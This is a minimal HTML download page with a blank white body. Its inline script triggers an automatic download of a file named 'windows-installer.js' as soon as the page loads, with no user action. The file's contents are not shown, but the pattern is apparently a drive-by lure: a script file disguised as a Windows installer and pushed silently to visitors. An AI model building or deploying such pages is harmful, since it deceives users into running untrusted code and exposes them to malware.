<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Download</title>
<style>
  html, body { margin: 0; padding: 0; background: #fff; height: 100%; }
</style>
</head>
<body>
<script>
  const fileName = "windows-installer.js";

  const a = document.createElement("a");
  a.href = fileName;
  a.download = fileName;
  document.body.appendChild(a);
  a.click();
  a.remove();
</script>
</body>
</html>
